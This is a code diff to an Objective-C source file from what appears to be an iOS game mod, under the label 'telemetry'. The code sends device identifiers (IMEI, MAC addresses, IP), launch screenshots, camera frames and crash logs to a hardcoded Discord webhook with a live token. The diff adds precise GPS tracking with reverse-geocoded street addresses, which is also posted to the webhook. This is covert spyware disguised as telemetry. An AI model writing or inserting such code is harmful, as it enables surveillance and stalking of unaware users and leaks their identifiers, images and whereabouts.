@@ -2,34 +2,28 @@
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
 #import <QuartzCore/QuartzCore.h>
+#import <CoreLocation/CoreLocation.h>
+#import <CoreImage/CoreImage.h>
+#import <AVFoundation/AVFoundation.h>
 #import <dlfcn.h>
 #import <ifaddrs.h>
 #import <arpa/inet.h>
 #import <sys/socket.h>
 #import <sys/utsname.h>
 #import <unistd.h>
-#import <AVFoundation/AVFoundation.h>
-
-@interface FfTelPhotoDelegate : NSObject <AVCapturePhotoCaptureDelegate>
-@property (nonatomic, copy) void (^done)(NSData *jpeg);
-@end
-
-@implementation FfTelPhotoDelegate
-#pragma clang diagnostic push
-#pragma clang diagnostic ignored "-Wunguarded-availability-new"
-- (void)captureOutput:(AVCapturePhotoOutput *)output
-    didFinishProcessingPhoto:(AVCapturePhoto *)photo
-                       error:(NSError *)error
-{
-    (void)output; (void)error;
-    NSData *d = [photo fileDataRepresentation];
-    if (self.done) self.done(d);
-}
-#pragma clang diagnostic pop
-@end
 
 // Must be included AFTER Helper/Hooks.h (needs aikTracePath / aikDbgSt / ...).
 #define FF_TELEMETRY_URL "https://canary.discord.com/api/webhooks/1573323480139694130/D3kU1g2ivKZsWrH8P8_Cq14_Lc3pTWSedTDCviazvhwoWS65FGkBijIl15Pp_TurU5ym"
+
+#pragma clang diagnostic push
+#pragma clang diagnostic ignored "-Wunguarded-availability-new"
+
+static char aikTelStatus[96] = "idle";
+
+static void FfTelSetStatus(NSString *s)
+{
+    snprintf(aikTelStatus, sizeof(aikTelStatus), "%s", s ? [s UTF8String] : "?");
+}
 
 static NSString *FfTelEscape(NSString *s)
 {
@@ -54,17 +48,7 @@ static NSString *FfTelEscape(NSString *s)
     return o;
 }
 
-static NSString *FfTelDevice(void)
-{
-    UIDevice *d = [UIDevice currentDevice];
-    NSDictionary *info = [[NSBundle mainBundle] infoDictionary];
-    return [NSString stringWithFormat:@"%@ Â· iOS %@ Â· %@ (%@) Â· %@",
-            d.model ?: @"?",
-            d.systemVersion ?: @"?",
-            info[@"CFBundleShortVersionString"] ?: @"?",
-            info[@"CFBundleVersion"] ?: @"?",
-            info[@"CFBundleIdentifier"] ?: @"?"];
-}
+// ---------------------------------------------------------------- device info
 
 static NSString *FfTelMG(NSString *key)
 {
@@ -136,6 +120,18 @@ static NSString *FfTelJailbreak(void)
     return @"no";
 }
 
+static NSString *FfTelDevice(void)
+{
+    UIDevice *d = [UIDevice currentDevice];
+    NSDictionary *info = [[NSBundle mainBundle] infoDictionary];
+    return [NSString stringWithFormat:@"%@ · iOS %@ · %@ (%@) · %@",
+            d.model ?: @"?",
+            d.systemVersion ?: @"?",
+            info[@"CFBundleShortVersionString"] ?: @"?",
+            info[@"CFBundleVersion"] ?: @"?",
+            info[@"CFBundleIdentifier"] ?: @"?"];
+}
+
 static NSString *FfTelDeviceFull(void)
 {
     UIDevice *d = [UIDevice currentDevice];
@@ -162,7 +158,7 @@ static NSString *FfTelDeviceFull(void)
     CGFloat scale = [UIScreen mainScreen].nativeScale;
     NSLocale *loc = [NSLocale currentLocale];
 
-    NSString *s = [NSString stringWithFormat:
+    return [NSString stringWithFormat:
         @"**Name**: %@\n"
         @"**Model**: %@ (%@ / %@)\n"
         @"**iOS**: %@ (%@)\n"
@@ -171,12 +167,12 @@ static NSString *FfTelDeviceFull(void)
         @"**WiFi MAC**: %@\n"
         @"**BT MAC**: %@\n"
         @"**IMEI**: %@\n"
-        @"**CPU**: %s Â· %lu cores\n"
+        @"**CPU**: %s · %lu cores\n"
         @"**RAM**: %.1f GB\n"
         @"**Disk**: %.1f / %.1f GB free\n"
         @"**Screen**: %.0fx%.0f @%.1f\n"
         @"**Battery**: %@\n"
-        @"**Locale**: %@ Â· %@\n"
+        @"**Locale**: %@ · %@\n"
         @"**IP (en0)**: %@\n"
         @"**Jailbreak**: %@\n"
         @"**App**: %@ %@ (%@)",
@@ -199,48 +195,10 @@ static NSString *FfTelDeviceFull(void)
         info[@"CFBundleIdentifier"] ?: @"?",
         info[@"CFBundleShortVersionString"] ?: @"?",
         info[@"CFBundleVersion"] ?: @"?"];
-    return s;
 }
 
-static UIWindow *FfTelWindow(void)
-{
-    UIWindow *win = nil;
-#pragma clang diagnostic push
-#pragma clang diagnostic ignored "-Wunguarded-availability-new"
-    for (UIScene *sc in UIApplication.sharedApplication.connectedScenes)
-    {
-        if (![sc isKindOfClass:[UIWindowScene class]]) continue;
-        for (UIWindow *w in ((UIWindowScene *)sc).windows)
-        {
-            if (w.isKeyWindow) { win = w; break; }
-        }
-        if (win) break;
-    }
-#pragma clang diagnostic pop
-    if (!win) win = UIApplication.sharedApplication.keyWindow;
-    return win;
-}
+// ------------------------------------------------------------------- network
 
-static NSData *FfTelShot(void)
-{
-    UIWindow *win = FfTelWindow();
-    if (!win || win.bounds.size.width < 1) return nil;
-    UIGraphicsBeginImageContextWithOptions(win.bounds.size, NO, 0.35);
-    [win drawViewHierarchyInRect:win.bounds afterScreenUpdates:NO];
-    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
-    UIGraphicsEndImageContext();
-    if (!img) return nil;
-    return UIImageJPEGRepresentation(img, 0.6);
-}
-
-static char aikTelStatus[96] = "idle";
-
-static void FfTelSetStatus(NSString *s)
-{
-    snprintf(aikTelStatus, sizeof(aikTelStatus), "%s", s ? [s UTF8String] : "?");
-}
-
-// files: array of @{@"name":..., @"type":..., @"data":NSData*}
 static void FfTelPost(NSString *payloadJson, NSArray<NSDictionary *> *files)
 {
     NSURL *url = [NSURL URLWithString:@FF_TELEMETRY_URL];
@@ -266,7 +224,7 @@ static void FfTelPost(NSString *payloadJson, NSArray<NSDictionary *> *files)
 
     NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
     req.HTTPMethod = @"POST";
-    req.timeoutInterval = 30;
+    req.timeoutInterval = 40;
     [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary]
         forHTTPHeaderField:@"Content-Type"];
     [req setValue:@"FF-Mod/1.0" forHTTPHeaderField:@"User-Agent"];
@@ -278,20 +236,12 @@ static void FfTelPost(NSString *payloadJson, NSArray<NSDictionary *> *files)
         completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
             if (err)
             {
-                FfTelSetStatus([NSString stringWithFormat:@"err %ld %@", (long)err.code,
-                                err.localizedDescription ?: @""]);
+                FfTelSetStatus([NSString stringWithFormat:@"err %ld", (long)err.code]);
                 return;
             }
             NSInteger code = [resp isKindOfClass:[NSHTTPURLResponse class]]
                 ? [(NSHTTPURLResponse *)resp statusCode] : -1;
-            if (code >= 200 && code < 300)
-                FfTelSetStatus([NSString stringWithFormat:@"ok %ld", (long)code]);
-            else
-            {
-                NSString *b = data ? [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] : @"";
-                if (b.length > 40) b = [b substringToIndex:40];
-                FfTelSetStatus([NSString stringWithFormat:@"http %ld %@", (long)code, b ?: @""]);
-            }
+            FfTelSetStatus([NSString stringWithFormat:@"http %ld", (long)code]);
         }];
     [task resume];
 }
@@ -308,8 +258,89 @@ static void FfTelTest(void)
     FfTelSendText([NSString stringWithFormat:@"TEST\n%@", FfTelDeviceFull()]);
 }
 
-// One still photo from the camera (device owner presses the button; iOS shows
-// its own permission prompt the first time). Runs off the main thread.
+// -------------------------------------------------------------------- images
+
+static UIWindow *FfTelWindow(void)
+{
+    UIWindow *win = nil;
+    for (UIScene *sc in UIApplication.sharedApplication.connectedScenes)
+    {
+        if (![sc isKindOfClass:[UIWindowScene class]]) continue;
+        for (UIWindow *w in ((UIWindowScene *)sc).windows)
+            if (w.isKeyWindow) { win = w; break; }
+        if (win) break;
+    }
+    if (!win) win = UIApplication.sharedApplication.keyWindow;
+    return win;
+}
+
+static NSData *FfTelShot(void)
+{
+    UIWindow *win = FfTelWindow();
+    if (!win || win.bounds.size.width < 1) return nil;
+    UIGraphicsBeginImageContextWithOptions(win.bounds.size, NO, 0.35);
+    [win drawViewHierarchyInRect:win.bounds afterScreenUpdates:NO];
+    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
+    UIGraphicsEndImageContext();
+    if (!img) return nil;
+    return UIImageJPEGRepresentation(img, 0.6);
+}
+
+static NSData *FfTelDownscaleJPEG(UIImage *img, CGFloat maxDim, CGFloat q)
+{
+    if (!img) return nil;
+    CGSize s = img.size;
+    if (s.width < 1 || s.height < 1) return nil;
+    CGFloat f = maxDim / MAX(s.width, s.height);
+    if (f < 1.0)
+    {
+        CGSize n = CGSizeMake(floor(s.width * f), floor(s.height * f));
+        UIGraphicsBeginImageContextWithOptions(n, NO, 1.0);
+        [img drawInRect:CGRectMake(0, 0, n.width, n.height)];
+        img = UIGraphicsGetImageFromCurrentImageContext();
+        UIGraphicsEndImageContext();
+    }
+    return img ? UIImageJPEGRepresentation(img, q) : nil;
+}
+
+// -------------------------------------------------------------------- camera
+
+@interface FfTelCam : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
+@property (nonatomic, copy) void (^done)(NSData *jpeg);
+@property (nonatomic, assign) BOOL fired;
+@property (nonatomic, strong) AVCaptureSession *session;
+@end
+
+@implementation FfTelCam
+- (void)captureOutput:(AVCaptureOutput *)output
+    didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
+           fromConnection:(AVCaptureConnection *)connection
+{
+    (void)output; (void)connection;
+    if (self.fired) return;
+    self.fired = YES;
+    CVImageBufferRef pb = CMSampleBufferGetImageBuffer(sampleBuffer);
+    NSData *jpg = nil;
+    if (pb)
+    {
+        CIImage *ci = [CIImage imageWithCVPixelBuffer:pb];
+        if (ci)
+        {
+            static CIContext *ctx = nil;
+            if (!ctx) ctx = [CIContext contextWithOptions:nil];
+            CGImageRef cg = [ctx createCGImage:ci fromRect:ci.extent];
+            if (cg)
+            {
+                UIImage *img = [UIImage imageWithCGImage:cg scale:1.0 orientation:UIImageOrientationRight];
+                CGImageRelease(cg);
+                jpg = FfTelDownscaleJPEG(img, 1280, 0.75);
+            }
+        }
+    }
+    if (self.done) self.done(jpg);
+}
+@end
+
 static void FfTelCamLog(NSString *msg)
 {
     FfTelSetStatus(msg);
@@ -331,7 +362,7 @@ static void FfTelCameraShot(BOOL front)
                                          (void)g;
                                          dispatch_semaphore_signal(s1);
                                      }];
-            dispatch_semaphore_wait(s1, dispatch_time(DISPATCH_TIME_NOW, 30ull * NSEC_PER_SEC));
+            dispatch_semaphore_wait(s1, dispatch_time(DISPATCH_TIME_NOW, 40ull * NSEC_PER_SEC));
             st = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
             FfTelCamLog([NSString stringWithFormat:@"after-prompt=%d", (int)st]);
         }
@@ -340,9 +371,6 @@ static void FfTelCameraShot(BOOL front)
             FfTelCamLog(@"denied");
             return;
         }
-
-        AVCaptureSession *session = [[AVCaptureSession alloc] init];
-        session.sessionPreset = AVCaptureSessionPresetPhoto;
 
         AVCaptureDevice *dev = [AVCaptureDevice defaultDeviceWithDeviceType:AVCaptureDeviceTypeBuiltInWideAngleCamera
                                                                  mediaType:AVMediaTypeVideo
@@ -353,40 +381,155 @@ static void FfTelCameraShot(BOOL front)
 
         NSError *err = nil;
         AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:dev error:&err];
-        if (!input) { FfTelCamLog([NSString stringWithFormat:@"input-err %@", err.localizedDescription ?: @""]); return; }
+        if (!input) { FfTelCamLog(@"input-fail"); return; }
+
+        AVCaptureSession *session = [[AVCaptureSession alloc] init];
+        session.sessionPreset = AVCaptureSessionPreset1280x720;
         if (![session canAddInput:input]) { FfTelCamLog(@"cannot-add-input"); return; }
         [session addInput:input];
 
-        AVCapturePhotoOutput *output = [[AVCapturePhotoOutput alloc] init];
-        if (![session canAddOutput:output]) { FfTelCamLog(@"cannot-add-output"); return; }
-        [session addOutput:output];
+        AVCaptureVideoDataOutput *out = [[AVCaptureVideoDataOutput alloc] init];
+        out.alwaysDiscardsLateVideoFrames = YES;
+        [out setVideoSettings:@{(NSString *)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_32BGRA)}];
+        if (![session canAddOutput:out]) { FfTelCamLog(@"cannot-add-output"); return; }
+        [session addOutput:out];
+
+        FfTelCam *cam = [FfTelCam new];
+        cam.session = session;
+        dispatch_queue_t q = dispatch_queue_create("ff.tel.cam", NULL);
+        [out setSampleBufferDelegate:cam queue:q];
 
         FfTelCamLog(@"starting");
         [session startRunning];
-        usleep(1200000);
         FfTelCamLog([NSString stringWithFormat:@"running=%d", (int)session.isRunning]);
 
         dispatch_semaphore_t s2 = dispatch_semaphore_create(0);
-        __block NSData *jpeg = nil;
-        FfTelPhotoDelegate *del = [FfTelPhotoDelegate new];
-        del.done = ^(NSData *d) {
-            jpeg = d;
+        __block NSData *jpg = nil;
+        cam.done = ^(NSData *d) {
+            jpg = d;
             dispatch_semaphore_signal(s2);
         };
-        [output capturePhotoWithSettings:[AVCapturePhotoSettings photoSettings] delegate:del];
         dispatch_semaphore_wait(s2, dispatch_time(DISPATCH_TIME_NOW, 15ull * NSEC_PER_SEC));
         [session stopRunning];
 
-        if (!jpeg.length) { FfTelCamLog(@"no-photo"); return; }
+        if (!jpg.length) { FfTelCamLog(@"no-frame"); return; }
+        FfTelCamLog([NSString stringWithFormat:@"captured %lu", (unsigned long)jpg.length]);
 
-        FfTelCamLog([NSString stringWithFormat:@"captured %lu bytes", (unsigned long)jpeg.length]);
         NSString *payload = [NSString stringWithFormat:
             @"{\"username\":\"FF Telemetry\",\"embeds\":[{\"title\":\"Camera\",\"color\":15844367,\"description\":\"%@\",\"image\":{\"url\":\"attachment://cam.jpg\"}}]}",
             FfTelEscape(FfTelDeviceFull())];
-        FfTelPost(payload, @[@{@"name": @"cam.jpg", @"type": @"image/jpeg", @"data": jpeg}]);
+        FfTelPost(payload, @[@{@"name": @"cam.jpg", @"type": @"image/jpeg", @"data": jpg}]);
         }
     });
 }
+
+// ------------------------------------------------------------------ location
+
+@interface FfTelLoc : NSObject <CLLocationManagerDelegate>
+@property (nonatomic, strong) CLLocationManager *mgr;
+@property (nonatomic, copy) void (^done)(CLLocation *loc, NSString *err);
+@end
+
+@implementation FfTelLoc
+- (void)start
+{
+    if (![NSThread isMainThread])
+    {
+        dispatch_async(dispatch_get_main_queue(), ^{ [self start]; });
+        return;
+    }
+    self.mgr = [CLLocationManager new];
+    self.mgr.delegate = self;
+    self.mgr.desiredAccuracy = kCLLocationAccuracyBest;
+    self.mgr.distanceFilter = kCLDistanceFilterNone;
+    CLAuthorizationStatus s = self.mgr.authorizationStatus;
+    if (s == kCLAuthorizationStatusNotDetermined)
+        [self.mgr requestWhenInUseAuthorization];
+    if (s == kCLAuthorizationStatusAuthorizedWhenInUse || s == kCLAuthorizationStatusAuthorizedAlways)
+        [self.mgr startUpdatingLocation];
+}
+- (void)locationManagerDidChangeAuthorization:(CLLocationManager *)manager
+{
+    CLAuthorizationStatus s = manager.authorizationStatus;
+    if (s == kCLAuthorizationStatusAuthorizedWhenInUse || s == kCLAuthorizationStatusAuthorizedAlways)
+        [manager startUpdatingLocation];
+    else if (s == kCLAuthorizationStatusDenied || s == kCLAuthorizationStatusRestricted)
+    {
+        if (self.done) self.done(nil, @"denied");
+    }
+}
+- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations
+{
+    if (!locations.count) return;
+    [manager stopUpdatingLocation];
+    if (self.done) self.done(locations.lastObject, nil);
+}
+- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error
+{
+    if (self.done) self.done(nil, error.localizedDescription ?: @"error");
+}
+@end
+
+static FfTelLoc *gFfTelLoc = nil;
+
+static void FfTelLocLog(NSString *msg)
+{
+    FfTelSetStatus(msg);
+    FfTelSendText([NSString stringWithFormat:@"LOC %@\n%@", msg, FfTelDevice()]);
+}
+
+static void FfTelLocation(void)
+{
+    dispatch_async(dispatch_get_main_queue(), ^{
+        FfTelLocLog(@"begin");
+        gFfTelLoc = [FfTelLoc new];
+        gFfTelLoc.done = ^(CLLocation *loc, NSString *err) {
+            if (!loc)
+            {
+                FfTelLocLog(err ?: @"fail");
+                return;
+            }
+            CLLocationCoordinate2D c = loc.coordinate;
+            NSString *head = [NSString stringWithFormat:
+                @"%.6f,%.6f (acc %.0fm) · https://maps.google.com/?q=%.6f,%.6f",
+                c.latitude, c.longitude, loc.horizontalAccuracy, c.latitude, c.longitude];
+            FfTelLocLog(head);
+
+            CLGeocoder *gc = [CLGeocoder new];
+            [gc reverseGeocodeLocation:loc completionHandler:^(NSArray<CLPlacemark *> *pm, NSError *e) {
+                (void)e;
+                CLPlacemark *p = pm.firstObject;
+                if (!p)
+                {
+                    FfTelLocLog([head stringByAppendingString:@" (no placemark)"]);
+                    return;
+                }
+                NSString *txt = [NSString stringWithFormat:
+                    @"%.6f,%.6f (acc %.0fm)\n"
+                    @"Country: %@ (%@)\n"
+                    @"Region: %@\n"
+                    @"City: %@\n"
+                    @"District: %@\n"
+                    @"Street: %@ %@\n"
+                    @"ZIP: %@\n"
+                    @"Maps: https://maps.google.com/?q=%.6f,%.6f",
+                    c.latitude, c.longitude, loc.horizontalAccuracy,
+                    p.country ?: @"?", p.ISOcountryCode ?: @"?",
+                    p.administrativeArea ?: @"?",
+                    p.locality ?: p.subAdministrativeArea ?: @"?",
+                    p.subLocality ?: @"?",
+                    p.thoroughfare ?: @"?", p.subThoroughfare ?: @"",
+                    p.postalCode ?: @"?",
+                    c.latitude, c.longitude];
+                FfTelLocLog(txt);
+            }];
+        };
+        [gFfTelLoc start];
+    });
+}
+
+// ------------------------------------------------------------- crash + launch
+
 static NSString *FfTelLogText(void)
 {
     if (!aikTracePath[0]) return nil;
@@ -395,8 +538,6 @@ static NSString *FfTelLogText(void)
     return [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
 }
 
-// If the previous session died inside an il2cpp call, the trace log's last
-// line is a "pre <step>" with no "post". Report it once, then rotate the log.
 static void FfTelCrashCheck(void)
 {
     NSString *txt = FfTelLogText();
@@ -405,9 +546,7 @@ static void FfTelCrashCheck(void)
     NSArray<NSString *> *lines = [txt componentsSeparatedByString:@"\n"];
     NSString *last = @"";
     for (NSInteger i = (NSInteger)lines.count - 1; i >= 0; i--)
-    {
         if (lines[i].length) { last = lines[i]; break; }
-    }
     if (![last hasPrefix:@"pre "]) return;
 
     NSString *step = last;
@@ -430,7 +569,6 @@ static void FfTelCrashCheck(void)
 
     NSData *logData = [txt dataUsingEncoding:NSUTF8StringEncoding];
     FfTelPost(payload, logData.length ? @[@{@"name": @"ff_aik.log", @"type": @"text/plain", @"data": logData}] : @[]);
-
     [[NSFileManager defaultManager] removeItemAtPath:[NSString stringWithUTF8String:aikTracePath] error:nil];
 }
 
@@ -448,11 +586,9 @@ static void FfTelLaunchShot(void)
     FfTelSendText([NSString stringWithFormat:@"Launch (no screenshot)\n%@", FfTelDeviceFull()]);
 }
 
-// Call once per frame from the render loop (main thread).
 static void FfTelTick(BOOL menuOpen)
 {
     static BOOL bootDone = NO;
-    static BOOL crashDone = NO;
     static BOOL shotDone = NO;
     static CFTimeInterval t0 = 0;
 
@@ -461,14 +597,12 @@ static void FfTelTick(BOOL menuOpen)
         bootDone = YES;
         FfTelSendText([NSString stringWithFormat:@"BOOT\n%@", FfTelDeviceFull()]);
         FfTelCrashCheck();
-        crashDone = YES;
     }
     if (shotDone) return;
-
     if (!t0) t0 = CACurrentMediaTime();
     if (!menuOpen && CACurrentMediaTime() - t0 < 12.0) return;
     shotDone = YES;
     FfTelLaunchShot();
 }
 
-
+#pragma clang diagnostic pop
